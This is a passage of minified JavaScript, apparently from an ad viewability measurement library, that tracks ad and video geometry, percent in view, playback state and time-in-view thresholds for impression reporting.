        }, a.hasOwnProperty("adWasClipped") && (t.adWasClipped = !0)) : (r && (s = !0, t = {
          x: 0,
          y: 0,
          width: 0,
          height: 0
        }), o = !1), (o && function (e) {
          return !I.isDef(r) || !1 !== I(e).compareTo(r);
        }(t) || s) && (r = t, n.trigger(A.OMID_GEOMETRY_MEASUREMENT_CHANGED, {
          adGeometry: t,
          adFound: o
        }));
      };
      return {
        start: function () {
          i(), t.setInterval(i, 50);
        },
        addAdGeometryMeasurementChangedListener: function (e) {
          n.on(A.OMID_GEOMETRY_MEASUREMENT_CHANGED, e);
        }
      };
    },
    dn = function (e, t, n, r, i) {
      "use strict";

      var o,
        a,
        s,
        c,
        u,
        d = "videoGeometryMeasurementChanged",
        g = !1,
        f = !1,
        l = function () {
          if (!(I.isUndef(a) || I.isUndef(s) || I.isUndef(c))) {
            u = !0;
            var e = i.calculateGeometricMeasurement(a, s),
              t = g && f,
              n = g && e.percentageInView >= 50,
              l = {
                windowDimensions: e.windowDimensions,
                containerDimensions: e.containerDimensions,
                adDimensions: e.adDimensions,
                percentageInView: e.percentageInView,
                detectionMethod: e.detectionMethod,
                isMeasurable: !0,
                isObstructed: e.isObstructed,
                sliceStatus: e.sliceStatus,
                isVideoPlaying: g,
                isVideoPlayingInFullscreen: t,
                isSoundOn: !0
              },
              E = e.omidObstructions;
            I.isDef(E) && "" !== E && (l.omidObstructions = E), t && (l.percentageInView = 100), t || n ? l.viewState = A.IN_VIEW : (l.viewState = A.OUT_OF_VIEW, l.outOfViewReason = e.outOfViewReason || A.OUT_OF_VIEW_REASONS.VIDEO), o = l, r.trigger(d, o);
          }
        },
        E = function (e) {
          a = e, l();
        },
        p = function (e) {
          s = e, l();
        },
        m = function (e) {
          c = e;
          var t = e.eventType;
          "AdEnteredFullscreen" === t ? f = !0 : "AdExitedFullscreen" === t ? f = !1 : -1 !== "AdStarted|AdVideoStart|AdPlaying".indexOf(t) ? g = !0 : -1 !== "AdSkipped|AdUserClose|AdPaused|AdVideoComplete|AdStopped|AdError".indexOf(t) && (g = !1), l();
        };
      return {
        start: function () {
          T.getAggregator().trigger(F.ADD_OUTPUT_ITEM, {
            output: A.MEDIA_TYPE.VIDEO_CODE
          }, A.MEDIA_TYPE_CODE, {
            type: A.IMPRESSION_EVENT
          }), e.addAdContainerGeometryMeasurementChangedListener(E), e.start(), t.addAdGeometryMeasurementChangedListener(p), t.start(), n.addVideoPlaybackEventListener(m), n.start();
        },
        getStrategyName: function () {
          return A.MEASUREMENT_STRATEGY.VIDEO;
        },
        addMeasurementChangedListener: function (e) {
          r.on(d, e);
        },
        isMeasurable: function () {
          return u;
        }
      };
    },
    gn = function (e, t, n) {
      "use strict";

      var r;
      var i = function () {
        var t,
          i,
          o,
          a = e.find(),
          s = !1;
        I.isDef(a) ? (o = !0, t = {
          x: (i = a.getBoundingClientRect()).left,
          y: i.top,
          width: i.width,
          height: i.height
        }, a.hasOwnProperty("adWasClipped") && (t.adWasClipped = !0)) : (r && (s = !0, t = {
          x: 0,
          y: 0,
          width: 0,
          height: 0
        }), o = !1), (o && function (e) {
          return !I.isDef(r) || !1 !== I(e).compareTo(r);
        }(t) || s) && (r = t, n.trigger(A.OMID_GEOMETRY_MEASUREMENT_CHANGED, {
          adGeometry: t,
          adFound: o
        }));
      };
      return {
        start: function () {
          i(), t.setInterval(i, 50);
        },
        addAdGeometryMeasurementChangedListener: function (e) {
          n.on(A.OMID_GEOMETRY_MEASUREMENT_CHANGED, e);
        }
      };
    },
    fn = function (e, t, n) {
      "use strict";

      return {
        accepts: function () {
          var r = I(e.mraid).isObj();
          return n && (r || t);
        },
        isImmediate: function () {
          return !0;
        },
        supportsAdContainerGeometry: function () {
          return !1;
        },
        start: function () {}
      };
    },
    ln = function (e, t) {
      "use strict";

      var n = "mraidScreenLocationChanged",
        r = "mraid.js",
        i = !1,
        o = function () {
          var r, i, o;
          try {
            r = e.mraid.isViewable() ? 100 : 0;
            var a = {
              x: 0,
              y: 0,
              width: 0,
              height: 0
            };
            o = 100 === r ? [!0] : [!1], i = {
              windowDimensions: a,
              adDimensions: a,
              containerDimensions: a,
              shouldDelegateToDomBasedViewability: !1,
              isMeasurable: !0,
              isObstructed: !1,
              isHidden: !1,
              percentageInView: r,
              detectionMethod: A.DETECTION_METHODS.MRAID,
              sliceStatus: o
            }, t.trigger(n, i);
          } catch (e) {}
        },
        a = function () {
          var t = e.mraid;
          !0, o(), t.addEventListener("viewableChange", o);
        },
        s = function () {
          var t = e.mraid;
          (function () {
            var t = e.mraid;
            return I(t).isObj() && I.isFunction(t.isViewable);
          })() && (i = !0, "loading" === t.getState() ? t.addEventListener("ready", function () {
            a();
          }) : a());
        },
        c = function () {
          i || s();
        };
      return {
        start: function () {
          var t;
          t = !0, (I.isDef(e.mraid) || Oe.containsScriptTagWithSrc(r)) && (t = !1), T.getAggregator().trigger(F.ADD_OUTPUT_ITEM, {
            output: I.stringifyTriState(t)
          }, W.MRAID_INJECTION_STATUS, {
            type: A.IMPRESSION_EVENT
          }), t ? T.getAggregator().trigger(F.EXEC, r, c) : s();
        },
        addScreenLocationChangedListener: function (e) {
          t.on(n, e);
        }
      };
    },
    En = function (e, t, n) {
      "use strict";

      var r = {};
      return n && I(n).map(function (n, i) {
        var o, a;
        r[n] = (o = i, a = I.noop, t.bootstrapOn("useViewabilityNotification") && (a = function () {
          e.skipAsFraudulent() || T.getAggregator().trigger(F.NOTIFY, o);
        }), a);
      }), {
        getCallbacks: function () {
          return r;
        }
      };
    },
    pn = function () {
      "use strict";

      var t = new _n({
          tiv: [1e4]
        }),
        n = I([A.IN_VIEW, A.PARTIAL_VIEW_PLUS]);
      return {
        timeInViewThresholds: t,
        type: A.DT_CODES.FULLY_INVIEW,
        rts: {},
        isInView: function (e) {
          var t = We.max(e.fullPercentInView || 0, e.percentInView);
          return n.contains(e.viewState) && 100 === t;
        },
        applies: function (t, n) {
          return t.on("abcAudit") && 925955 == e.anId && n.usesIASFullyInViewCustomMetric();
        },
        minUnit: 1e3,
        shouldIncludeSound: !1
      };
    },
    mn = function (t, n) {
      "use strict";

      var r,
        i,
        o,
        a = t.on("everySecond"),
        s = n.isVideo(),
        c = [1e3, 2e3, 3e3, 4e3, 5e3, 6e3, 7e3, 8e3, 9e3, 1e4, 11e3, 12e3, 13e3, 14e3, 15e3],
        u = [1e3, 5e3, 15e3, 3e4, 45e3, 6e4, 9e4],
        d = [2e3, 5e3, 15e3],
        g = function (e, t) {
          var n = t ? "viewStateIgnoringRender" : "viewState";
          return -1 !== (A.IN_VIEW + "|" + A.PARTIAL_VIEW_PLUS).indexOf(e[n]);
        };
      return a ? (r = new _n({
        tiv: c
      }), i = c[0]) : s ? (r = new _n({
        tiv: d
      }), i = d[0]) : (r = new _n({
        tiv: u
      }), i = u[0]), (o = {
        5e3: e._onInViewMRC5,
        15e3: e._onInViewMRC15
      })[i] = e._onInViewMRC, {
        timeInViewThresholds: r,
        type: A.DT_CODES.PING,
        rts: o,
        isInView: g,
        isInViewIgnoringRender: function (e) {
          return g(e, !0);
        },
        applies: !0,
        minUnit: 1e3,
        shouldIncludeSound: !1,
        sendOtherwiseInViewSignal: !0
      };
    },
    In = function (e, t) {
      "use strict";

      var n,
        r = e.on("everySecond"),
        i = t.isVideo(),
        o = t.usesIASFullyInViewCustomMetric(),
        a = function (e) {
          var t = We.max(e.fullPercentInView || 0, e.percentInView);
          return -1 !== (A.IN_VIEW + "|" + A.PARTIAL_VIEW_PLUS).indexOf(e.viewState) && 100 === t;
        };
      return n = new _n(r ? {
        tiv: [1e3, 2e3, 3e3, 4e3, 5e3, 6e3, 7e3, 8e3, 9e3, 1e4, 11e3, 12e3, 13e3, 14e3, 15e3]
      } : i ? {
        tiv: [2e3, 5e3, 15e3]
      } : {
        tiv: [1e3, 5e3, 15e3]
      }), T.getAggregator().provide("isFullyInViewProvider", {
        isFullyInView: a
      }), {
        timeInViewThresholds: n,
        type: A.DT_CODES.FULLY_INVIEW,
        isInView: a,
        applies: function () {
          return o;
        },
        minUnit: 1e3,
        shouldIncludeSound: !1
      };
    },
    hn = function (t, n) {
      "use strict";

      return {
        timeInViewThresholds: new _n({
          tiv: [0]
        }),
        type: A.DT_CODES.FULLY_INVIEW,
        rts: {
          0: e._onInViewFull
        },
        isInView: function (e) {
          var t = We.max(e.fullPercentInView || 0, e.percentInView);
          return -1 !== (A.IN_VIEW + "|" + A.PARTIAL_VIEW_PLUS).indexOf(e.viewState) && 100 === t;
        },
        applies: function () {
          return n.usesGroupMCustomMetric();
        },
        minUnit: 1e3,
        shouldIncludeSound: !1
      };
    },
    Tn = function (t, n) {
      "use strict";

      var r,
        i,
        o,
        a,
        s,
        c,
        u = We.getMaxNumber(),
        d = n.isVideo(),
        g = t.id,
        f = t.sound && "on" === t.sound,
        l = !(t.soundExcl && "groupm_native" === t.soundExcl && e.groupm_native_publisher) && f,
        E = function (e, n) {
          if (!e.adDimensions) return !1;
          var r,
            i,
            o,
            a,
            s = n ? "percentInViewIgnoringRender" : "percentInView",
            c = e.adDimensions.area(),
            g = 1 === e.tabHidden,
            f = We.max(e.fullPercentInView || 0, e[s]);
          return r = I(t.thresholds).findFirst(function (e, t) {
            if (i = t.lb || 0, o = t.ub || u, c >= i && c <= o) return !0;
          }), a = !g && f >= r.piv, function (e) {
            return e.method == A.DETECTION_METHODS.AD_PLACEHOLDER;
          }(e) && function (e) {
            return 0 === e.tiv;
          }(t) && (a = !1), d && (a = a && e.isVideoPlaying, l && (a = a && e.isSoundOn)), a;
        };
      return r = new _n(t), i = t.qiv, o = {}, I.isDef(e.rts) && I.isDef(e.rts[g]) && (s = r && I.isFunction(r.getTimeThresholds) && r.getTimeThresholds()[0], c = I.isDef(s) ? I.isFunction(s.getTimeInViewForRts) && s.getTimeInViewForRts() : A.RTS_KEY_FOR_VQ, o[c] = e.rts[g]), a = t.minunit ? 1e3 * t.minunit : 1e3, {
        timeInViewThresholds: r,
        qivThreshold: i,
        type: A.DT_CODES.CUSTOM,
        rts: o,
        isInView: E,
        isInViewIgnoringRender: function (e) {
          return E(e, !0);
        },
        metricId: g,
        minUnit: a,
        thresholdType: t.thresholdType,
        shouldIncludeSound: l,
        sendOtherwiseInViewSignal: !0
      };
    },
    An = function (e, t, n) {
      "use strict";

      var r = "groupmCM",
        i = t.isVideo() ? "video" : "display",
        o = t.isMobileApp() ? "app" : "web",
        a = t.isDeviceTypeGroupMobile() ? "mobile" : "desktop",
        s = I(e.customViewability).isArray() && e.customViewability.length > 0,
        c = n.on("customMetric"),
        u = n.on(r),
        d = function (e, t) {
          var n, s, c, d;
          return n = I(t.mediaTypes).contains(i), s = I(t.distributionChannels).contains(o), c = !I.isDef(t.deviceGroups) || I(t.deviceGroups).contains(a), d = !Xe.contains(t.id, "fiv"), Xe.contains(t.id, r) && (d = u), d && n && s && c;
        };
      return {
        resolve: function () {
          var t,
            n = [];
          return c && s && (t = I(e.customViewability).filter(d), I(t).each(function (e, t) {
            n.push(t);
          })), n;
        }
      };
    },
    _n = function (e) {
      "use strict";

      var t = [];
      if (I(e.tiv).isArray()) I(e.tiv).each(function (e, n) {
        t.push(new vn(n));
      });else if ("string" == typeof e.tiv) {
        var n = e.tiv.split("|"),
          r = new Dn();
        t.push(new Sn(r, parseInt(n[1].replace("%")))), t.push(new vn(1e3 * parseInt(n[0])));
      } else I.isDef(e.tiv) && t.push(new vn(1e3 * e.tiv));
      return {
        getTimeThresholds: function () {
          return t;
        }
      };
    },
    Dn = function () {
      "use strict";

      var e = T.getAggregator().request(x.OMID_AD_SESSION_CONTEXT).adDuration || -1,
        t = function (t) {
          if (!n()) {
            var r = I.isDef(t.ad_duration) ? t.ad_duration : t.adRemainingTime;
            (function (e) {
              return void 0 !== e && e > 0;
            })(r) && (e = Math.ceil(r));
          }
        },
        n = function () {
          return e > 0;
        };
      return T.getAggregator().on({
        omidAdDuration: t,
        adVideoStart: t,
        adDurationChange: t
      }), {
        getAdDuration: function () {
          return e;
        },
        isVideoDurationResolved: n
      };
    },
    vn = function (e) {
      "use strict";

      var t,
        n = 0;
      return e > 0 && (n = e / 1e3), t = 1e3 * n, {
        getTimeInViewInSeconds: function () {
          return n;
        },
        getTimeInViewForRts: function () {
          return t;
        }
      };
    },
    Sn = function (e, t) {
      "use strict";

      var n = 0,
        r = !1,
        i = function (e) {
          n = 0, t > 0 && e > 0 && (n = We.ceil(e * (t / 100)));
        };
      return i(15), {
        getTimeInViewInSeconds: function () {
          return !r && e.isVideoDurationResolved() && (r = !0, i(e.getAdDuration())), n;
        },
        getTimeInViewForRts: function () {
          return 0;
        }
      };
    },
    On = function (e, t, n, r) {
      "use strict";

      var i = r ? "isInViewIgnoringRender" : "isInView",
        o = function (r) {
          e[i](r) ? (t.mark(), n.doEligibleJobs(t.getTotalTime())) : t.stop();
        };
      return {
        start: function () {
          e.addMeasurementChangedListener(o);
        }
      };
    },
    Rn = function (e, t, n, r) {
      "use strict";

      var i,
        o,
        a,
        s,
        c,
        u,
        d = function (e, t) {
          return !t && e;
        },
        g = function (e, t, n, r) {
          return !!r || !t && (e || r) && n;
        },
        f = function (e) {
          var d,
            f = 0,
            E = 1 === e.tabHidden,
            p = e.isVideoPlaying,
            m = e.isSoundOn,
            h = e.isVideoPlayingInFullscreen;
          I(e.sliceStatus).each(function (e, t) {
            a(t, E, p, h) ? i[e].mark() : i[e].stop(), s[e] = i[e].getTotalTime();
          }), l("slcVt", s), r && (I(e.sliceStatus).each(function (e, t) {
            !function (e, t, n, r, i) {
              return g(e, t, n, r) && i;
            }(t, E, p, h, m) ? o[e].stop() : o[e].mark(), c[e] = o[e].getTotalTime();
          }), l("slcVtVol", c)), u = r && t && t.shouldIncludeSound ? c : s, d = I(u).findFirst(function (e, t) {
            return f = Math.max(f, t), t <= 0;
          }), I.isUndef(d) && n.doEligibleJobs(f);
        },
        l = function (e, t) {
          var n = {};
          n[e] = t, T.getAggregator().trigger(F.ADD_OUTPUT_ITEM, {
            output: n
          }, {
            minDt: !1
          });
        },
        E = function (e) {
          I.isUndef(e.sliceStatus) || (i || function (e) {
            !i && e.sliceStatus && (i = [], o = [], s = [], c = [], I(e.sliceStatus).each(function (e) {
              i.push(new ae(1)), s.push(0), r && (o.push(new ae(1)), c.push(0));
            }));
          }(e), f(e));
        };
      return {
        start: function () {
          a = r ? g : d, e.addMeasurementChangedListener(E);
        }
      };
    },
    Nn = function (e, t, n) {
      "use strict";

      return {
        isInView: e.isInView,
        isInViewIgnoringRender: e.isInViewIgnoringRender,
        addMeasurementChangedListener: function (e) {
          t.addMeasurementChangedListener(e, n);
        }
      };
    },
    yn = function (e, t, n, r, i, o, a, s, c, u) {
      "use strict";

      var d = "measurementChanged",
        g = !1,
        f = Ae.isVideo(),
        l = o.request(x.MOBILE_APP),
        E = k().applies(n, i),
        p = n.browserIs(A.BROWSERS.GECKO) || E,
        m = Ae.xDomainIframe && !p,
        I = new ie(10),
        h = function () {
          i.on("viewabilityready") && !g && (r.send(A.DT_CODES.VIEWABILITY_READY), o.trigger(F.MEASURABLE), g = !0);
        };
      o.on(F.DELAYED_VIEWABILITY_READY, function () {
        T(), h();
      }), o.on(F.DELAYED_VIEWABILITY_READY_CALL_ONLY, h);
      var T = function (n) {
        n = n || !1;
        try {
          var r, i;
          I.start(), t.hasMeasurementStrategy() ? i = (l.isMobileAppEnvironment() || Ae.isOmidNative()) && t.supportsAdContainerGeometry() ? t.getScreenLocationInfo({}, n) : t.getScreenLocationInfo(s.collect(), n) : (i = s.collect(), l.isMobileAppEnvironment() ? (i.viewState = A.NA, i.method = A.NA, i.percentInView = A.NA) : m && (i.viewState = A.NA, i.percentInView = A.PIV_NA), f && u.setVideoSpecificScreenEventFields(i)), r = c.registerLocation(i), n || e.trigger(d, i), I.stop();
          var g = We.round(I.getTime() / I.getCount());
          return a.addItem({
            output: g
          }, "lt", {
            type: A.DT_CODES.UNLOAD
          }), r;
        } catch (e) {
          o.trigger(F.ERROR, A.ERROR_CODES.CHECK_SCREEN_LOC);
        }
      };
      return {
        checkScreenLoc: T,
        stringifyPingTimes: function () {
          return i.on("everySecond") ? "1-2-3-4-5-6-7-8-9-10-11-12-13-14-15" : f ? "2-5-15" : "1-5-15";
        },
        isImmediatelyMeasurable: function () {
          var e = Ae.xDomainIframe,
            r = e && n.browserIs(A.BROWSERS.WEBKIT),
            i = e && n.browserIs(A.BROWSERS.MSEDGE),
            o = !r && !i && !(e && E);
          return l.isMobileAppEnvironment() ? t.isMeasurable() : o;
        },
        requiresDelayedViewabilityEvent: function () {
          l.isMobileAppEnvironment() && t.hasMeasurementStrategy() && t.requiresDelayedViewabilityEvent();
        },
        addMeasurementChangedListener: function (t) {
          e.on(d, t);
        }
      };
    },
    Cn = {
      name: "viewabilityLoopLifecycle",
      dependencies: [x.VIEWABILITY, x.FEATURES, x.CONTEXT, x.BROWSER],
      creator: function (n, r, i, o) {
        "use strict";

        var a,
          s = Mn(i),
          c = [new bn(), new wn(s)],
          u = function (e) {
            "sessionFinish" === e.type && (T.getAggregator().trigger(F.ADD_OUTPUT_ITEM, {
              output: Ae.getTagTime()
            }, W.OMID_SESSION_FINISH), T.getAggregator().trigger(F.AD_SESSION_COMPLETE));
          },
          d = function () {
            var e,
              t = T.getAggregator().request(x.MOBILE_APP).isMobileAppEnvironment();
            T.getAggregator().request(x.IDS).impressionIsIdentifiable() && (a = function (e, t) {
              var n,
                r = t,
                i = function (t) {
                  n || (t && e(), n = We.setInterval(e, r));
                },
                o = function (t) {
                  n && (t && e(), We.clearInterval(n), n = null);
                };
              return {
                start: i,
                stop: o,
                updateFrequency: function (e, t) {
                  r = e, n && (o(), i(t));
                }
              };
            }(n.checkScreenLoc, s.getPollingFrequency()), (e = I(c).findFirst(function (e, t) {
              return t.applies(o, r, i) ? t : void 0;
            })) ? e.start(a) : a.start(!0), Ae.isOmid() ? T.getAggregator().request(x.OMID_VERIFICATION_CLIENT).registerSessionObserver(u, "IAS") : g(t ? "MOBILE_APP_TEST_EVENT_AD_SESSION_COMPLETE" : "beforeunload"));
          },
          g = function (e) {
            _e.addEvent(t, e, function () {
              T.getAggregator().trigger(F.AD_SESSION_COMPLETE);
            }, !1);
          },
          f = function () {
            i.isVideo() && !i.isOmid() && l(), T.getAggregator().trigger(F.UNLOAD), a && a.stop(), T.getAggregator().trigger(F.END_AD_SESSION), T.getAggregator().trigger(F.STOP_AD_TALK);
          },
          l = function () {
            var t = new De(A.DT_CODES.VIDEO_EVENTS);
            T.getAggregator().trigger(F.SEND_DT, t.callType, t.enumerator, function () {
              var t = {
                id: e.videoId,
                msg: "unloadComplete",
                messageType: "misc"
              };
              We.getWindow().postMessage(JSON.stringify(t), "*");
            });
          };
        T.getAggregator().once(F.START_VIEWABILITY_LOOP, d), T.getAggregator().once(F.AD_SESSION_COMPLETE, f);
      },
      settings: {
        tier: A.TIERS.VIEWABILITY
      }
    },
    Mn = function (e) {
      "use strict";

      return {
        getPollingFrequency: function () {
          return e.isVideo() ? 200 : 100;
        },
        getOptimizedPollingFrequency: function () {
          return 1e3;
        }
      };
    },
    wn = function (e) {
      "use strict";

      var t,
        n,
        r,
        i,
        o,
        a = !0,
        s = function (c) {
          if (r && !o && c < 1) return o = !0, void We.setTimeout(function () {
            s(c);
          }, 1e3);
          i = c < 1, !n && i ? (n = !0, t.updateFrequency(e.getOptimizedPollingFrequency(), a)) : n && !i && (n = !1, t.updateFrequency(e.getPollingFrequency(), a));
        },
        c = function (e) {
          s(e.percentInView);
        };
      return {
        applies: function (e, t, n) {
          var i = t.on("viewabilityOptimization");
          return r = n.usesZeroPivCustomMetric(), i;
        },
        start: function (e) {
          (t = e).start(a), T.getAggregator().on(F.IO_PIV_CHANGE, s), T.getAggregator().on(F.NEW_SCREEN_EVENT, c);
        }
      };
    },
    bn = function () {
      "use strict";

      var e,
        t,
        n,
        r = !0,
        i = !1,
        o = function (a) {
          return n && !i && a < 1 ? (i = !0, void We.setTimeout(function () {
            o(a);
          }, 1e3)) : (a < 1 ? (e || t.stop(r), e = !0) : e && (e = !1, t.start(r)), e);
        },
        a = function () {
          t.start(r);
        };
      return {
        applies: function (e, t, r) {
          n = r.usesZeroPivCustomMetric();
          var i = k();
          return t.on("viewabilityOptimization") && i.applies(e, t, r) && r.isDeviceTypeGroupMobile();
        },
        start: function (e) {
          (t = e).start(r), T.getAggregator().on(F.IO_PIV_CHANGE, o), T.getAggregator().on(F.NODES_ADDED, a);
        }
      };
    },
    Pn = function (r, i, o, a, s, c) {
      "use strict";

      var u,
        d,
        g,
        f,
        l,
        E,
        p,
        m,
        h,
        _,
        D = Oe.getElementsWindow(i),
        v = (Oe.getElementsDocument(i), T.getAggregator().provide(x.IFRAME_CALCULATOR_HELPER, nr(D)), Qn(i, a)),
        S = A.AD_IDENTIFIER + "-" + e.asid,
        O = !1,
        R = Se({}),
        N = Ae.isDeviceTypeGroupMobile(),
        y = Ae.usesGroupMCustomMetricMobilePassThru(),
        C = function () {
          return u || (u = v.calcDims(i, a, g), e.autotagSizeSet && e.adWidth > 1 && e.adHeight > 1 && (u.set("width", e.adWidth), u.set("height", e.adHeight)), M() ? w(u) : o === A.DETECTION_METHODS.AD_PLACEHOLDER && u.treatAsPlaceholder()), u;
        },
        M = function () {
          return o === A.DETECTION_METHODS.VIDEO && Ae.embedded;
        },
        w = function (e) {
          var t = new Se(i).getRounded();
          try {
            e.set("width", t.width), e.set("height", t.height);
          } catch (e) {
            T.getAggregator().trigger(F.ERROR, A.ERROR_CODES.VIDEO_IN_IFRAME_DIMS_CALC);
          }
        },
        b = function () {
          return !1;
        },
        P = function () {
          var e,
            n = U(),
            i = v.getClippedDims && (M() || Ae.isCeltra());
          return n ? d = g.getPiv() : I.isUndef(d) && (e = !N && (Ae.friendly || I.isDef(t.mozInnerScreenX)) && s.on("offscreen"), m = C(), p = new Se(Oe.calcWinDims()), E = new Se(e ? Oe.calcMonDims() : {}), h = i ? v.getClippedDims() : R, d = r.calcPercentInView(m, p, E, h)), d;
        },
        V = function () {
          return r.calcInitialViewState(P());
        },
        L = function () {
          return i !== t && C().isHidden();
        },
        U = function () {
          var e = Ae.xDomainIframe && O,
            t = N && O && g.isReady();
          return e || t;
        };
      return function () {
        var e = We.getWindow(),
          t = We.getDoc(),
          n = i === e,
          a = t.body,
          s = T.getAggregator(),
          c = new k(),
          u = s.request(x.BROWSER),
          d = s.request(x.FEATURES),
          E = s.request(x.CONTEXT),
          p = !Ae.xDomainIframe,
          m = n && a ? t.body : i;
        if (_ = Ae.friendlyIframe ? e.frameElement : m, _e.addEvent(m, "click", function (e) {
          T.getAggregator().trigger(F.AD_COMPONENT_CLICKED, e);
        }), _e.addEvent(m, "touchend", function (e) {
          T.getAggregator().trigger(F.AD_COMPONENT_TOUCHED, e);
        }), _e.addEvent(m, "mouseover", function (e) {
          T.getAggregator().trigger(F.AD_COMPONENT_MOUSED_OVER, e);
        }), _e.addEvent(m, "mouseout", function (e) {
          T.getAggregator().trigger(F.AD_COMPONENT_MOUSED_OUT, e);
        }), c.applies(u, d, E)) {
          if ((g = _t(i, p)).start(), O = !0, y && o !== A.DETECTION_METHODS.AD_PLACEHOLDER) {
            var I = new lr(C().getRounded()),
              h = new hr(),
              D = new Tr(g.getObservedNode(), h);
            f = new pr(I.getSlices(), D);
          }
        } else y && (l = new mr(r));
      }(), {
        mark: function () {
          Oe.setAttributeOf(_, S, "");
        },
        cleanup: function () {
          Oe.removeAttributeOf(_, S);
        },
        isNode: function (e) {
          return i === e;
        },
        isHidden: L,
        isObstructed: b,
        getDims: C,
        getPercentInView: P,
        getLocationState: V,
        getOnPageViewability: function () {
          return L() ? A.OUT_OF_VIEW : V();
        },
        getDetectionMethod: function () {
          return o;
        },
        getContainerDims: function () {
          return v.allowsOptimization ? u : Se(a);
        },
        refresh: function () {
          u = void 0, d = void 0, E = void 0, p = void 0, m = void 0, h = void 0, c && function () {
            var e, r;
            if (!Ae.isDomless() && (r = i.parentNode)) {
              for (; i !== t && r && r !== n && !e;) e = r === a, r = r.parentNode;
              e || (a = i.parentNode);
            }
          }();
        },
        getAdNode: function () {
          return i;
        },
        getSliceStatus: function () {
          var e;
          return f && f.isReadyToMeasure() ? e = f.getSliceStatus() : Ae.friendly && l && I.isDef(m) && (e = l.getSliceStatus(m, p, E, h)), e;
        }
      };
    },
    Vn = function (e, t) {
      "use strict";

      var n,
        r = [],
        i = I([]),
        o = function () {
          return r[0] && r[0].getDetectionMethod() === A.DETECTION_METHODS.AD_PLACEHOLDER;
        },
        a = function (a, s, c, u) {
          var d,
            g = o() || 0 === r.length,
            f = Pn(e, a, s, c, t, u);
          o() && (d = r.shift(), i = I(r), d.cleanup(), n = void 0), r.push(f), i = I(r), g && f.mark(), g && s !== A.DETECTION_METHODS.AD_PLACEHOLDER && T.getAggregator().trigger(F.PRIMARY_AD_FOUND, f);
        },
        s = function () {
          if (n) return n;
          var e,
            t = !1,
            r = 0,
            o = 0;
          return i.each(function (n, i) {
            var a,
              s = i.getDims();
            s.hasValidDims() && (e = i.getPercentInView(), t = e !== A.NA, a = s.area(), r += a, o += e / 100 * a);
          }), n = {
            totalArea: r,
            totalInView: o,
            hasMeasurement: t
          };
        },
        c = function (e) {
          var t = T.getAggregator().request(x.AD_RENDER_STATUS);
          return !e && !t;
        },
        u = function (e) {
          var t,
            n = s();
          return t = n.hasMeasurement ? We.round(n.totalInView / n.totalArea * 100) : A.PIV_NA, (isNaN(t) || c(e)) && (t = 0), t;
        },
        d = function (n) {
          var r = t.bootstrapOn(W.MOB_OR_TAB),
            i = s().totalArea >= A.MRC_LARGE_AD_SIZE && t.on("largeAd") && !r && !Ae.isVideo();
          return e.calcInitialViewState(u(n), i);
        },
        g = function (e) {
          var t = -1;
          return i.each(function (n, r) {
            r.isNode(e) && (t = n);
          }), t;
        },
        f = function (e) {
          return function () {
            return r[0] && r[0][e]();
          };
        };
      return T.getAggregator().on(F.AD_COMPONENT_ADDED, function (e) {
        I(e).each(function (e, t) {
          -1 === g(t) && a(t, A.DETECTION_METHODS.MUTATION);
        });
      }), T.getAggregator().on(F.AD_COMPONENT_REMOVED, function (e) {
        I(e).each(function (e, t) {
          var n = g(t);
          n > -1 && r.splice(n, 1);
        });
      }), {
        getDims: f("getDims"),
        isObstructed: f("isObstructed"),
        getDetectionMethod: f("getDetectionMethod"),
        getContainerDims: f("getContainerDims"),
        getViewState: d,
        getViewStateIgnoringRender: function () {
          return d(!0);
        },
        getPercentInView: u,
        getPercentInViewIgnoringRender: function () {
          return u(!0);
        },
        isHidden: f("isHidden"),
        isUsingPlaceholder: o,
        hasAd: function () {
          return !!r.length;
        },
        refresh: function () {
          n = void 0, i.each(function (e, t) {
            t.refresh();
          });
        },
        addAdComponent: a,
        clearCollection: function () {
          i.each(function (e, t) {
            t.cleanup();
          }), r = [], i = I([]), n = void 0;
        },
        getOutOfViewReasons: function (e) {
          var t,
            i = [],
            o = r[0],
            a = A.OUT_OF_VIEW_REASONS;
          return o && (t = n || d(), c(e) ? i.push(a.RENDER) : t !== A.OUT_OF_VIEW && t !== A.PARTIAL_VIEW_MINUS || i.push(a.GEOM), o.isHidden() && i.push(a.HIDDEN), o.isObstructed() && i.push(a.OBSTRUCTION)), i;
        },
        getComponentCount: function () {
          return r.length;
        },
        getComponents: function () {
          return r;
        },
        getSliceStatus: f("getSliceStatus")
      };
    },
    Ln = function () {
      "use strict";

      var e,
        t,
        n,
        r = function (e) {
          e ? e && n && (We.execAtEndOfThread(function () {
            T.getAggregator().trigger(F.DELAYED_VIEWABILITY_READY_CALL_ONLY);
          }), n = !1) : n = !0;
        };
      return {
        detectionMethod: function () {
          return t && t.detectionMethod;
        },
        isApplicable: function (e) {
          return e.isBustedIframe();
        },
        find: function () {
          t = t || kn();
          var n = Oe.crossQuerySelector(kn().getCssSelector(), !0);
          return e = n ? n.parentNode : e, r(n), n;
        },
        getAdContainer: function () {
          return e;
        },
        allowForAdContainerChange: !0
      };
    },
    Fn = function (t, n) {
      "use strict";

      var r,
        i = t || e.contextNode.parentNode,
        o = Oe.findChildWithLargestContent(i, n);
      return Oe.getNodeArea(o) > 1 && !o[A.IAS_DETECTOR] && (r = o), r;
    },
    Un = function () {
      "use strict";

      var e = T.getAggregator().request(x.OMID_AD_SESSION_CONTEXT);
      return {
        usePlaceholder: !0,
        detectionMethod: A.DETECTION_METHODS.OMID,
        isApplicable: function () {
          return Ae.isOmidForWeb() && !Ae.isOmidNative();
        },
        find: function () {
          return e.element || e.queuedOutputItems.push({
            code: "oea",
            value: !0
          }), e.element;
        },
        getAdContainer: function () {
          return e.element && e.element.parentNode;
        },
        allowForAdContainerChange: !0
      };
    },
    xn = function () {
      "use strict";

      return {
        detectionMethod: A.DETECTION_METHODS.IFRAME,
        find: function () {
          return t;
        },
        isApplicable: function () {
          return Ae.embedded;
        },
        getAdContainer: function () {
          return e.contextNode.parentNode;
        },
        allowForAdContainerChange: !0
      };
    },
    Wn = function () {
      "use strict";

      var e,
        t = We.getDoc().scripts,
        n = function () {
          return e || (e = I(t).findFirst(function (e, t) {
            return Xe.contains(t.src, "servedby.flashtalking");
          })), e;
        };
      return {
        detectionMethod: A.DETECTION_METHODS.BUSTED_IFRAME_FLASHTALKING,
        isApplicable: function (e, t) {
          return t.on("bustediframe") && e.embedded && void 0 !== n();
        },
        getCssSelector: function () {
          var t,
            r = function () {
              var t,
                r = e || n();
              return r && r.src && (t = r.src.match(/;(\d+);/)[1]), t;
            }(),
            i = "#ftdiv" + r,
            o = "#ftframe" + r;
          try {
            t = I([i, o]).findFirst(function (e, t) {
              return Oe.crossQuerySelector(t, true);
            });
          } catch (e) {}
          return t;
        }
